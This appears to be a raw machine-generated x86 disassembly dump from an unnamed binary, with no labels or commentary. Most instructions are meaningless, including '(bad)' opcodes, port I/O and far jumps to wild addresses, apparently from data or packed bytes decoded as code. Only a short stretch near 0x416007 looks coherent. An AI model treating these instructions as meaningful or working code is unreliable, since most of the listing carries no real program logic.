  415b55:	data16 mov ch,0x3e
  415b58:	cmp    edx,DWORD PTR [edx-0x50]
  415b5b:	sbb    eax,0xba11caa2
  415b60:	sub    eax,0xfcf2bca9
  415b65:	xor    ebx,DWORD PTR [ecx+0x2acd3ed8]
  415b6b:	test   edx,ecx
  415b6d:	cmc    
  415b6e:	lahf   
  415b6f:	scas   eax,DWORD PTR es:[edi]
  415b70:	dec    ecx
  415b71:	sbb    BYTE PTR [ebx+0x31818440],ah
  415b77:	mov    ?,WORD PTR [eax]
  415b79:	jae    0x415b89
  415b7b:	sbb    DWORD PTR [eax+0x3],edx
  415b7e:	push   es
  415b7f:	cmp    ebx,ecx
  415b81:	and    esi,DWORD PTR [eax-0x2194657]
  415b87:	shr    BYTE PTR [esi+ecx*4],cl
  415b8a:	mov    ebp,0x8a84e15b
  415b8f:	mov    edx,0xe8c0ce5e
  415b94:	jle    0x415be0
  415b96:	test   BYTE PTR [esi+ebx*2-0x2d],bl
  415b9a:	cmp    al,0xbd
  415b9c:	jp     0x415b21
  415b9e:	and    BYTE PTR [ecx-0x2393b40e],0x8
  415ba5:	enter  0x3d8a,0xef
  415ba9:	(bad)  
  415baa:	push   0xffffffbb
  415bac:	inc    edx
  415bad:	aaa    
  415bae:	adc    esp,DWORD PTR [ecx+0x4086c47f]
  415bb4:	fsub   QWORD PTR [esi-0x49268235]
  415bba:	pop    edx
  415bbb:	leave  
  415bbc:	pop    edi
  415bbd:	xor    ecx,ecx
  415bbf:	dec    esi
  415bc0:	lods   eax,DWORD PTR ds:[esi]
  415bc1:	icebp  
  415bc2:	inc    ebp
  415bc3:	and    DWORD PTR [edx+0x49313b9c],ebx
  415bc9:	dec    eax
  415bca:	push   cs
  415bcb:	lods   eax,DWORD PTR ds:[esi]
  415bcc:	enter  0xd9b6,0xc2
  415bd0:	ss mov bl,0xdc
  415bd3:	repz jns 0x415b85
  415bd6:	or     edi,DWORD PTR [ecx+0x6f7fa63a]
  415bdc:	or     ebp,eax
  415bde:	je     0x415b7f
  415be0:	nop
  415be1:	in     eax,dx
  415be2:	sub    DWORD PTR [esi-0x6a],ebp
  415be5:	cmp    eax,0x551eb0b7
  415bea:	sub    eax,0xeb8e046f
  415bef:	sbb    cl,BYTE PTR ds:0x5606a91b
  415bf5:	xchg   ebp,eax
  415bf6:	out    0xa3,eax
  415bf8:	pusha  
  415bf9:	ja     0x415be1
  415bfb:	int3   
  415bfc:	enter  0xe7c9,0x7b
  415c00:	pop    ss
  415c01:	into   
  415c02:	jg     0x415bc9
  415c04:	pop    edx
  415c05:	dec    eax
  415c06:	das    
  415c07:	sbb    BYTE PTR [esi+0x52e49b63],ch
  415c0d:	into   
  415c0e:	fucom  st(1)
  415c10:	sub    BYTE PTR [esi-0x25],bh
  415c13:	push   edi
  415c14:	iret   
  415c15:	add    DWORD PTR [edx],edx
  415c17:	adc    bh,BYTE PTR [ecx-0x49]
  415c1a:	daa    
  415c1b:	loop   0x415c27
  415c1d:	xor    ch,BYTE PTR [eax+0x767f3a06]
  415c23:	test   al,0xd4
  415c25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c26:	out    0xa7,al
  415c28:	cmp    eax,0xc52b0c50
  415c2d:	add    DWORD PTR [ecx+0x364bd7ca],0x90911348
  415c37:	xchg   ebp,eax
  415c38:	enter  0x99b5,0x7c
  415c3c:	dec    esi
  415c3d:	adc    bh,BYTE PTR [ebx+0x23]
  415c40:	push   ecx
  415c41:	nop
  415c42:	fnstenv [ecx-0x5d]
  415c45:	mov    eax,ds:0x315c811b
  415c4a:	pop    ds
  415c4b:	push   es
  415c4c:	adc    ebp,edi
  415c4e:	nop
  415c4f:	mov    dl,0x39
  415c51:	push   ds
  415c52:	ins    BYTE PTR es:[edi],dx
  415c53:	out    dx,al
  415c54:	mov    ds,WORD PTR [ebp-0x3c3f687]
  415c5a:	je     0x415c54
  415c5c:	repnz mov bl,0xf
  415c5f:	dec    esi
  415c60:	loopne 0x415c20
  415c62:	and    BYTE PTR [ecx-0x6b96265],dh
  415c68:	inc    ebx
  415c69:	nop
  415c6a:	je     0x415c4c
  415c6c:	out    0x94,al
  415c6e:	(bad)  
  415c6f:	pop    ebx
  415c70:	push   esp
  415c71:	add    DWORD PTR [edi-0x3a],edi
  415c74:	and    al,0x81
  415c76:	sub    ebx,eax
  415c78:	push   ss
  415c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c7a:	jecxz  0x415ca8
  415c7c:	jmp    0xe502f0b5
  415c81:	loope  0x415c33
  415c83:	xchg   DWORD PTR [ebx],esi
  415c85:	bound  edi,QWORD PTR [esi-0x5a]
  415c88:	in     al,0xd8
  415c8a:	sub    esp,ecx
  415c8c:	inc    ebx
  415c8d:	rol    DWORD PTR [ebx+0x43],0x6b
  415c91:	(bad)  
  415c92:	js     0x415cb0
  415c94:	cmc    
  415c95:	scas   eax,DWORD PTR es:[edi]
  415c96:	push   esi
  415c97:	xlat   BYTE PTR ds:[ebx]
  415c98:	cmp    ebp,DWORD PTR [esi]
  415c9a:	sbb    BYTE PTR [ebp+0x5806c3e1],cl
  415ca0:	in     al,0xb2
  415ca2:	sbb    eax,edx
  415ca4:	in     al,0xdd
  415ca6:	jmp    0x4b953bb5
  415cab:	ins    DWORD PTR es:[edi],dx
  415cac:	push   0x9a53e4b6
  415cb1:	fcmovb st,st(7)
  415cb3:	sub    BYTE PTR [ecx-0x5dabc530],ch
  415cb9:	ins    DWORD PTR es:[edi],dx
  415cba:	leave  
  415cbb:	cmp    ah,BYTE PTR [ebx+eiz*1+0x4c927ff1]
  415cc2:	imul   edi,DWORD PTR ds:0xbba086f3,0xa73997b4
  415ccc:	and    DWORD PTR [esi-0x59ad71b],esp
  415cd2:	jb     0x415d3a
  415cd4:	or     DWORD PTR [ecx+0x555fa7c9],esi
  415cda:	or     DWORD PTR [edi-0x3],edx
  415cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cde:	mov    edi,0x5a90c507
  415ce3:	inc    edx
  415ce4:	adc    BYTE PTR [edx+edx*1],dh
  415ce7:	dec    eax
  415ce8:	pop    es
  415ce9:	push   edi
  415cea:	cmc    
  415ceb:	mov    WORD PTR [esi-0x3a],gs
  415cee:	adc    ch,cl
  415cf0:	xchg   esi,eax
  415cf1:	test   BYTE PTR [eax],cl
  415cf3:	jl     0x415ce4
  415cf5:	xor    edx,DWORD PTR [ecx+edx*2-0x272c1092]
  415cfc:	pop    esp
  415cfd:	in     eax,dx
  415cfe:	int3   
  415cff:	jle    0x415c95
  415d01:	and    BYTE PTR [edi],dh
  415d03:	ret    0x300a
  415d06:	jns    0x415cf9
  415d08:	and    DWORD PTR [esi-0x5f32f802],edx
  415d0e:	or     eax,edi
  415d10:	cdq    
  415d11:	lock or al,0x4e
  415d14:	(bad)  
  415d16:	mov    ah,0x3
  415d18:	jmp    0xbda6:0xc87dc13e
  415d1f:	rcr    DWORD PTR [ecx+edi*4],0x62
  415d23:	enter  0x7da2,0xb1
  415d27:	std    
  415d28:	push   ebx
  415d29:	xchg   edx,eax
  415d2a:	pop    ebx
  415d2b:	pop    edx
  415d2c:	lea    edi,[ecx]
  415d2e:	(bad)  
  415d2f:	fimul  WORD PTR [edx+0x4a]
  415d32:	xchg   ecx,eax
  415d33:	je     0x415da0
  415d35:	(bad)  
  415d36:	pop    esi
  415d37:	sub    DWORD PTR es:0x1c5f524f,edx
  415d3e:	enter  0x5792,0x40
  415d42:	dec    BYTE PTR [ecx-0x1185256b]
  415d48:	adc    BYTE PTR [ebx-0x7852cc74],dh
  415d4e:	loope  0x415d0b
  415d50:	pop    ebp
  415d51:	xchg   esp,eax
  415d52:	jl     0x415d2f
  415d54:	xchg   esp,eax
  415d55:	push   ebx
  415d56:	adc    eax,0xe2074c53
  415d5b:	dec    ecx
  415d5c:	hlt    
  415d5d:	dec    ebp
  415d5e:	sub    al,0xd4
  415d60:	and    ebx,esp
  415d62:	sub    bl,ch
  415d64:	push   0x62
  415d66:	mov    ?,WORD PTR ss:[edi-0x67221268]
  415d6d:	in     al,0x66
  415d6f:	xchg   edi,eax
  415d70:	xor    edx,DWORD PTR [edi+0x6bfe23e8]
  415d76:	stos   DWORD PTR es:[edi],eax
  415d77:	push   eax
  415d78:	add    BYTE PTR [esp+edi*2],cl
  415d7b:	cmp    BYTE PTR [eax],0x6
  415d7e:	sbb    al,dl
  415d80:	jo     0x415dcd
  415d82:	push   0xffffff87
  415d84:	cmp    eax,0x62470174
  415d89:	dec    ebx
  415d8a:	jmp    0x415d67
  415d8c:	add    BYTE PTR [eax+ecx*4-0x7ae2714e],bh
  415d93:	and    eax,0x634637a4
  415d98:	clc    
  415d99:	pop    es
  415d9a:	lds    esp,FWORD PTR [edi-0xf]
  415d9d:	mov    gs,WORD PTR [bp+si+0x57b3]
  415da2:	pop    eax
  415da3:	pop    esi
  415da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415da5:	push   0xe1155399
  415daa:	imul   edi,DWORD PTR [ecx],0xd40ff68f
  415db0:	pop    eax
  415db1:	jae    0x415da1
  415db3:	inc    ebp
  415db4:	cmp    BYTE PTR [ecx+eax*2-0x25],ch
  415db8:	jge    0x415de2
  415dba:	cld    
  415dbb:	fcom   QWORD PTR [edi]
  415dbd:	data16 (bad) 
  415dbf:	cmp    al,0x45
  415dc1:	sub    BYTE PTR [edi+edx*1],bh
  415dc4:	fst    QWORD PTR [edx+0x51]
  415dc7:	or     esi,DWORD PTR [edx+0x1a08285d]
  415dcd:	stc    
  415dce:	fnstsw ax
  415dd0:	fmul   st(6),st
  415dd2:	repz add bh,BYTE PTR [ebx+0x7e]
  415dd6:	std    
  415dd7:	fidiv  WORD PTR [ecx+0x2a]
  415dda:	jno    0x415e05
  415ddc:	dec    edx
  415ddd:	ficomp DWORD PTR [ebx+ebx*4-0x5a1ed4ea]
  415de4:	lock bound ebp,QWORD PTR [ecx-0x2b0f2579]
  415deb:	jae    0x415e58
  415ded:	inc    ebx
  415dee:	adc    eax,DWORD PTR [edx]
  415df0:	or     eax,0x9406db6f
  415df5:	xor    edx,eax
  415df7:	jp     0x415e1a
  415df9:	aad    0xb2
  415dfb:	jecxz  0x415e7b
  415dfd:	aam    0x8c
  415dff:	scas   al,BYTE PTR es:[edi]
  415e00:	stos   BYTE PTR es:[edi],al
  415e01:	in     eax,dx
  415e02:	pushf  
  415e03:	inc    eax
  415e04:	mov    ds:0xc06e3b88,eax
  415e09:	rol    al,cl
  415e0b:	inc    eax
  415e0c:	fnstsw WORD PTR [edx-0x40e4e498]
  415e12:	(bad)
  415e15:	jg     0x415dac
  415e17:	(bad)  
  415e18:	mov    edx,0x3c789ac
  415e1d:	mov    edx,0x4c625132
  415e22:	jae    0x415e19
  415e24:	lods   eax,DWORD PTR ds:[esi]
  415e25:	sbb    dh,BYTE PTR [edi]
  415e27:	pop    eax
  415e28:	sbb    BYTE PTR [esi],0xd9
  415e2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e2c:	jg     0x415dcf
  415e2e:	(bad)  
  415e2f:	push   esp
  415e30:	pushf  
  415e31:	jae    0x415de1
  415e33:	aas    
  415e34:	test   al,0x68
  415e36:	jmp    0x415e5c
  415e38:	(bad)  
  415e39:	mov    bh,0x2a
  415e3b:	and    ebx,edx
  415e3d:	rcl    edx,1
  415e3f:	adc    DWORD PTR [edx],edi
  415e41:	push   ds
  415e42:	cs xchg ecx,eax
  415e44:	scas   eax,DWORD PTR es:[edi]
  415e45:	mul    BYTE PTR [esi]
  415e47:	sub    eax,DWORD PTR [eax]
  415e49:	ins    BYTE PTR es:[edi],dx
  415e4a:	ffree  st(7)
  415e4c:	and    BYTE PTR [eax+0x47d6271b],dl
  415e52:	mov    ah,0xfa
  415e54:	mov    DWORD PTR ds:0xfb225142,ecx
  415e5a:	sti    
  415e5b:	popf   
  415e5c:	aam    0x6f
  415e5e:	add    DWORD PTR [eax-0x60],edx
  415e61:	xor    eax,0x6b9ba195
  415e66:	mov    gs,WORD PTR [ebx+0x14]
  415e69:	das    
  415e6a:	push   es
  415e6b:	daa    
  415e6c:	push   ecx
  415e6d:	call   0x4066:0x7a5cef35
  415e74:	retf   0xb06d
  415e77:	dec    ebp
  415e78:	(bad)  
  415e79:	mov    edi,0xb86dbbf6
  415e7e:	inc    ecx
  415e7f:	sbb    BYTE PTR [ebp-0x5346a17c],al
  415e85:	sub    al,BYTE PTR [eax-0x4ff261d2]
  415e8b:	pop    ss
  415e8c:	iret   
  415e8d:	dec    ebx
  415e8e:	xchg   ebp,eax
  415e8f:	sti    
  415e90:	fst    DWORD PTR [ebx-0x39]
  415e93:	xchg   ebx,eax
  415e94:	add    ch,BYTE PTR [edi+0x46]
  415e97:	xor    BYTE PTR [ebx+0xd9ac150],dh
  415e9d:	mov    ds:0x5ad96a01,al
  415ea2:	add    ch,bl
  415ea4:	loopne 0x415f1a
  415ea6:	rol    eax,cl
  415ea8:	dec    esi
  415ea9:	mov    BYTE PTR [edx],0x61
  415eac:	push   esi
  415ead:	dec    ebp
  415eae:	inc    edi
  415eaf:	ins    DWORD PTR es:[edi],dx
  415eb0:	push   ss
  415eb1:	jbe    0x25817b65
  415eb7:	xchg   esi,eax
  415eb8:	enter  0xe436,0xf0
  415ebc:	sti    
  415ebd:	pop    ebx
  415ebe:	daa    
  415ebf:	(bad)
  415ec2:	je     0x415f12
  415ec4:	mov    esi,0xe3e8cd74
  415ec9:	pop    ebp
  415eca:	mov    esi,0x843224f0
  415ecf:	call   DWORD PTR [edi]
  415ed1:	fsubp  st(0),st
  415ed3:	push   edx
  415ed4:	dec    esi
  415ed5:	jne    0x415f17
  415ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed8:	sub    dl,cl
  415eda:	or     DWORD PTR [edx+0x41],ecx
  415edd:	sbb    al,0x91
  415edf:	adc    BYTE PTR [edi],al
  415ee1:	xchg   ecx,eax
  415ee2:	enter  0x5ec1,0xa2
  415ee6:	cld    
  415ee7:	xchg   ebp,eax
  415ee8:	clc    
  415ee9:	mov    BYTE PTR [ecx-0x2e],cl
  415eec:	sbb    DWORD PTR [ebx],ecx
  415eee:	dec    eax
  415eef:	rcr    bh,0x9e
  415ef2:	les    ebp,FWORD PTR [eax+0x66]
  415ef5:	cmp    edi,DWORD PTR [ebx-0x64b74046]
  415efb:	arpl   WORD PTR [edx+0x6f266567],bp
  415f01:	mov    ecx,0x285250d3
  415f06:	fisub  DWORD PTR [edi-0x7ffa5418]
  415f0c:	pop    ds
  415f0d:	sub    ch,BYTE PTR [edi+0x4f3b5236]
  415f13:	jae    0x415ec0
  415f15:	in     al,0xf8
  415f17:	rol    BYTE PTR [eax+0xc],1
  415f1a:	jle    0x415e9e
  415f1c:	add    cl,0x1e
  415f1f:	(bad)  
  415f20:	lds    edx,FWORD PTR [ebp+0x1c]
  415f23:	pop    esp
  415f24:	xor    eax,0xa725b36d
  415f29:	int3   
  415f2a:	retf   
  415f2b:	iret   
  415f2c:	mov    dl,cl
  415f2e:	iret   
  415f2f:	aam    0x22
  415f31:	sub    BYTE PTR [edx],dl
  415f33:	or     al,0x3b
  415f35:	adc    DWORD PTR [esi-0x62],ebp
  415f38:	fwait
  415f39:	rcr    dh,0x8e
  415f3c:	sahf   
  415f3d:	inc    ebp
  415f3e:	sbb    eax,0xdb90aaab
  415f43:	imul   eax,DWORD PTR [edi+0x148b43e1],0x1
  415f4a:	(bad)  
  415f4b:	mov    ch,0x35
  415f4d:	jmp    0x415f1f
  415f4f:	rcr    DWORD PTR [edx-0x5b],1
  415f52:	hlt    
  415f53:	lahf   
  415f54:	shl    bh,cl
  415f56:	inc    edx
  415f57:	out    0xcb,eax
  415f59:	stos   BYTE PTR es:[edi],al
  415f5a:	dec    ebx
  415f5b:	jno    0x415f8f
  415f5d:	(bad)  
  415f5e:	mov    BYTE PTR [ecx+eax*8],ah
  415f61:	cmp    ecx,DWORD PTR [ebp+0x42452c4a]
  415f67:	jp     0x415f01
  415f69:	test   ecx,edi
  415f6b:	je     0x415fe9
  415f6d:	(bad)  
  415f6e:	pop    ebx
  415f6f:	call   0x64a:0x7b96e45c
  415f76:	dec    ecx
  415f77:	inc    esi
  415f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f79:	test   eax,0xb2c1f12b
  415f7e:	jo     0x415f36
  415f80:	sti    
  415f81:	push   edx
  415f82:	or     BYTE PTR [edi],al
  415f84:	ret    
  415f85:	xchg   edi,eax
  415f86:	mov    ds:0xcacf68bc,eax
  415f8b:	out    0xc2,al
  415f8d:	pop    ecx
  415f8e:	mov    ebp,0x95f636fc
  415f93:	popa   
  415f94:	cmp    dh,BYTE PTR [ecx+0x4c74c011]
  415f9a:	aas    
  415f9b:	jle    0x415fd7
  415f9d:	cld    
  415f9e:	ja     0x415fbb
  415fa0:	inc    ebx
  415fa1:	push   ebx
  415fa2:	out    0x9a,eax
  415fa4:	xchg   esp,eax
  415fa5:	popf   
  415fa6:	mov    BYTE PTR [edi+0x703a92f1],0x8b
  415fad:	pushf  
  415fae:	rcr    DWORD PTR [edi-0x59d5d078],1
  415fb4:	cmp    DWORD PTR [ecx-0x55],edx
  415fb7:	scas   eax,DWORD PTR es:[edi]
  415fb8:	pop    eax
  415fb9:	jns    0x416017
  415fbb:	pop    ebx
  415fbc:	jnp    0x415fce
  415fbe:	xor    BYTE PTR [edi],cl
  415fc0:	out    dx,eax
  415fc1:	sbb    cl,BYTE PTR [edi+0x107a935a]
  415fc7:	pop    edi
  415fc8:	jne    0x415fcf
  415fca:	ds stc 
  415fcc:	mov    dh,0x6a
  415fce:	pusha  
  415fcf:	test   DWORD PTR [esp+edx*1],ebp
  415fd2:	jecxz  0x416037
  415fd4:	int    0xd9
  415fd6:	add    eax,0xabdf3754
  415fdb:	ss mov es,edi
  415fde:	jl     0x415fef
  415fe0:	cmp    BYTE PTR [ebp+0x2ca97fb7],ah
  415fe6:	mov    edx,0x8f107736
  415feb:	jo     0x41601f
  415fed:	pushf  
  415fee:	ss ret 
  415ff0:	push   eax
  415ff1:	lea    eax,[esi+0x44c684e]
  415ff7:	jl     0x415f90
  415ff9:	out    dx,eax
  415ffa:	or     BYTE PTR [edx+ebx*8],0xe7
  415ffe:	and    cl,BYTE PTR [ecx-0x37]
  416001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416002:	push   0xd333e3f8
  416007:	mov    DWORD PTR [ebp-0x50],edx
  41600a:	mov    edx,DWORD PTR [ebp+0x8]
  41600d:	mov    ebx,DWORD PTR [ebp-0x4c]
  416010:	add    edx,edi
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0x2da3532c
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	gs shl ah,cl
  41605e:	cmp    bh,0xc3
  416061:	arpl   WORD PTR [esi+0x28],dx
  416064:	inc    esp
  416065:	fldenv [eax+0x64]
  416068:	shl    dl,0xd8
  41606b:	pop    edx
  41606c:	lods   al,BYTE PTR ds:[esi]
  41606d:	ficomp WORD PTR [edi+0x2e]
  416070:	nop
  416071:	dec    ebp
  416072:	jo     0x4160e9
  416074:	pop    esp
  416075:	lds    esp,FWORD PTR [ebx+0x7e]
  416078:	enter  0x771e,0x4e
  41607c:	aas    
  41607d:	inc    esp
  41607e:	es jnp 0x41602e
  416081:	mov    ah,BYTE PTR [esi]
  416083:	xor    edx,DWORD PTR [ebp-0x3c]
  416086:	inc    ebp
  416087:	and    edi,DWORD PTR [esi+0x2dc0cc53]
  41608d:	mov    dl,0xba
  41608f:	and    al,0x38
  416091:	(bad)  
  416092:	push   eax
  416093:	cmc    
  416094:	and    esi,DWORD PTR [ecx]
  416096:	push   eax
  416097:	mov    ecx,0xa22d80a3
  41609c:	iret   
  41609d:	aaa    
  41609e:	dec    eax
  41609f:	jl     0x4160d9
  4160a1:	test   eax,0xf90c6c4c
  4160a6:	mov    ecx,0x3199b68f
  4160ab:	adc    edx,0x59562151
  4160b1:	dec    esp
  4160b2:	pushf  
  4160b3:	imul   edi,DWORD PTR [edx],0x69835426
  4160b9:	add    BYTE PTR [ecx+0x2],dh
  4160bc:	cvtpi2ps xmm1,QWORD PTR [esi-0x42]
  4160c0:	cwde   
  4160c1:	stc    
  4160c2:	sti    
  4160c3:	mov    esp,0x1df49bbf
  4160c8:	nop
  4160c9:	cs mov bl,0x70
  4160cc:	push   ecx
  4160cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160ce:	repz pop edi
  4160d0:	push   es
  4160d1:	neg    BYTE PTR [ebp-0x36]
  4160d4:	je     0x41607f
  4160d6:	jbe    0x416104
  4160d8:	push   0x66205a3e
  4160dd:	xor    ah,ah
  4160df:	jmp    0x2408f4a7
  4160e4:	pop    edx
  4160e5:	xchg   ecx,eax
  4160e6:	les    ecx,FWORD PTR [esi+0x2c]
  4160e9:	xor    ebx,DWORD PTR es:[ebp+0x32fda4e2]
  4160f0:	add    eax,0xfb59ec67
  4160f5:	(bad)  
  4160f6:	lods   al,BYTE PTR ds:[esi]
  4160f7:	ds add eax,0xafabd006
  4160fd:	dec    eax
  4160fe:	jp     0x4160a4
  416100:	jg     0x416096
  416102:	int3   
  416103:	adc    al,0x4b
  416105:	inc    edi
  416106:	xchg   esi,eax
  416107:	add    bh,al
  416109:	mov    bh,0x9a
  41610b:	(bad)  
  41610c:	fstp   st(3)
  41610e:	jne    0x4160c4
  416110:	and    esp,DWORD PTR [ebp-0x5530fa80]
  416116:	jo     0x416158
  416118:	inc    ebp
  416119:	and    eax,0xc88d6fa2
  41611e:	imul   ebp,DWORD PTR [esi+0x59390dcd],0x886005b0
  416128:	jecxz  0x4160ab
  41612a:	fs pop edi
  41612c:	pop    ecx
  41612d:	sbb    DWORD PTR [ecx-0x3a],ebp
  416130:	cli    
  416131:	loope  0x4161a7
  416133:	mov    bh,0xc0
  416135:	push   ecx
  416136:	or     BYTE PTR [ebp+0x2b190738],dh
  41613c:	test   eax,0xce8f5c5b
  416141:	ret    
  416142:	pop    ss
  416143:	pop    edx
  416144:	pop    ss
  416145:	mov    bh,0xd0
  416147:	sbb    al,0x22
  416149:	gs int 0xfd
  41614c:	mov    esi,0x95ee4996
  416151:	push   edx
  416152:	dec    esp
  416153:	popa   
  416154:	enter  0xdbb9,0xa9
  416158:	push   0x8
  41615a:	jl     0x416116
  41615c:	and    al,BYTE PTR [edi-0x462ecf78]
  416162:	inc    edx
  416163:	retf   
  416164:	shl    BYTE PTR [esi+0x55],cl
  416167:	cmp    edi,DWORD PTR [edi-0x55]
  41616a:	xchg   esi,eax
  41616b:	add    eax,0x6990fbce
  416170:	mov    gs,WORD PTR [edx-0x71acf5b2]
  416176:	pop    ebx
  416177:	iret   
  416178:	sub    DWORD PTR [ecx+0x2b7cf665],ebx
  41617e:	int3   
  41617f:	sbb    eax,0xfb4c22ff
  416184:	pop    es
  416185:	mov    ch,0x61
  416187:	mov    ecx,0x9cc15c78
  41618c:	mov    edx,0xfe0eb12
  416191:	int3   
  416192:	or     BYTE PTR [ebx],dh
  416194:	repz cmp al,0x3f
  416197:	shr    BYTE PTR [ebx-0x4e87d8dd],0x7b
  41619e:	cmp    DWORD PTR [edi-0x7ad5da],0x4ac3b06d
  4161a8:	outs   dx,BYTE PTR ds:[esi]
  4161a9:	inc    esi
  4161aa:	pop    ebx
  4161ab:	and    al,0x31
  4161ad:	std    
  4161ae:	adc    al,0x94
  4161b0:	addr16 repnz inc eax
  4161b3:	jns    0x41614b
  4161b5:	sub    DWORD PTR [edx-0x48],esp
  4161b8:	rcr    DWORD PTR [esi+0x23adaf1e],1
  4161be:	cs push 0xe1ec6c1e
  4161c4:	cmp    ecx,DWORD PTR [eax-0xb]
  4161c7:	(bad)  
  4161c8:	fild   DWORD PTR [edx-0x4bb98337]
  4161ce:	out    dx,eax
  4161cf:	js     0x416193
  4161d1:	push   ebx
  4161d2:	push   ebp
  4161d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161d4:	fdivr  DWORD PTR [ecx]
  4161d6:	out    dx,eax
  4161d7:	push   esp
  4161d8:	arpl   WORD PTR [esi+0x28a4de54],bp
  4161de:	popf   
  4161df:	icebp  
  4161e0:	lds    eax,FWORD PTR [esi+edx*1]
  4161e3:	mov    edi,0xa73d1542
  4161e8:	iret   
  4161e9:	and    al,0xeb
  4161eb:	xor    ah,BYTE PTR [edx-0x8918801]
  4161f1:	inc    eax
  4161f2:	sub    BYTE PTR [ecx],dh
  4161f4:	mov    WORD PTR ds:0x63c97389,es
  4161fa:	push   edi
  4161fb:	pop    ebp
  4161fc:	sub    DWORD PTR [ebx-0x34],ecx
  4161ff:	imul   esi,DWORD PTR ss:[ecx-0x73],0x2b
  416204:	sahf   
  416205:	mov    dh,0xcc
  416207:	in     eax,dx
  416208:	test   al,0x42
  41620a:	dec    edi
  41620b:	jge    0x4161c6
  41620d:	or     bl,BYTE PTR [ebp+0x1e]
  416210:	lods   al,BYTE PTR ds:[esi]
  416211:	bound  edx,QWORD PTR [esi-0x78]
  416214:	pop    esp
  416215:	push   0x14
  416217:	and    BYTE PTR [ebp-0x13],dl
  41621a:	push   ebp
  41621b:	and    edi,DWORD PTR [ecx+0x1b400300]
  416221:	pop    ebx
  416222:	mov    ch,0xd0
  416224:	in     eax,dx
  416225:	out    0xb8,ax
  416228:	dec    eax
  416229:	(bad)  
  41622a:	in     al,0x1d
  41622c:	ss loopne 0x416235
  41622f:	adc    bl,BYTE PTR [edi-0x71]
  416232:	lods   al,BYTE PTR ds:[esi]
  416233:	jle    0x416211
  416235:	stos   DWORD PTR es:[edi],eax
  416236:	and    eax,0xb96f58ca
  41623b:	push   ebp
  41623c:	xor    BYTE PTR [edi],bh
  41623e:	fiadd  DWORD PTR [edi+0x2124ccef]
  416244:	push   0xffffffdc
  416246:	push   0x426a5bae
  41624b:	idiv   BYTE PTR [esi+0x3e]
  41624e:	lods   al,BYTE PTR ds:[esi]
  41624f:	and    esi,ebp
  416251:	adc    edx,DWORD PTR [ecx]
  416253:	xor    ah,BYTE PTR [esi]
  416255:	inc    edi
  416256:	hlt    
  416257:	mov    eax,0xf86f882e
  41625c:	lds    eax,FWORD PTR [edi+eax*1+0x7d3175b0]
  416263:	push   ebp
  416264:	in     al,dx
  416265:	add    eax,0xbebe24f3
  41626a:	push   cs
  41626b:	retf   0x50b3
  41626e:	test   DWORD PTR [ecx],esp
  416270:	repnz pop ds
  416272:	or     ch,BYTE PTR [ebp+0x19]
  416275:	mov    ebp,0xbcdc03f
  41627a:	fst    DWORD PTR [ecx+0x65]
  41627d:	push   cs
  41627e:	push   ecx
  41627f:	pop    ebp
  416280:	xorps  xmm2,xmm2
  416283:	aad    0xde
  416285:	(bad)  
  416286:	not    BYTE PTR [esi]
  416288:	fs adc dl,dh
  41628b:	pop    eax
  41628c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41628d:	pop    ds
  41628e:	mov    bl,0x25
  416290:	push   ss
  416291:	mov    edx,0x708dca8a
  416296:	lahf   
  416297:	sti    
  416298:	ss sbb eax,0xc1416360
  41629e:	xchg   ebx,eax
  41629f:	and    esp,DWORD PTR [ecx-0x615eb474]
  4162a5:	outs   dx,DWORD PTR ds:[esi]
  4162a6:	stos   DWORD PTR es:[edi],eax
  4162a7:	sub    edi,DWORD PTR [ebp+0x78]
  4162aa:	mov    ds:0x78dc4c5f,al
  4162af:	jns    0x4162a9
  4162b1:	adc    DWORD PTR [eax-0x60],eax
  4162b4:	cmp    BYTE PTR [esi],ah
  4162b6:	sbb    ah,BYTE PTR [esi-0x33]
  4162b9:	jecxz  0x4162ed
  4162bb:	je     0x416287
  4162bd:	sub    DWORD PTR [edx-0x1e353849],0x3e
  4162c4:	push   0x9d1e1b99
  4162c9:	mov    esi,fs
  4162cb:	into   
  4162cc:	aad    0x41
  4162ce:	outs   dx,BYTE PTR ds:[esi]
  4162cf:	cld    
  4162d0:	fmul   DWORD PTR [edi]
  4162d2:	jl     0x416281
  4162d4:	inc    eax
  4162d5:	mov    DWORD PTR ds:0x3b31eb53,ebx
  4162db:	push   ebp
  4162dc:	xor    edx,DWORD PTR ds:0xf8fd1f7e
  4162e2:	sub    BYTE PTR [edx],al
  4162e4:	outs   dx,BYTE PTR ds:[esi]
  4162e5:	ja     0x416310
  4162e7:	int3   
  4162e8:	adc    ecx,DWORD PTR [ecx+0x1064eb15]
  4162ee:	repz mov al,ds:0xecdde900
  4162f4:	in     al,0xab
  4162f6:	and    eax,0x7b07ce65
  4162fb:	mov    ch,0xbd
  4162fd:	jmp    0xc0e0df8a
  416302:	pop    es
  416303:	mov    esp,0x45e99a23
  416308:	ret    
  416309:	fdivr  QWORD PTR ds:0x48f07b25
  41630f:	(bad)  
  416310:	xor    edi,edx
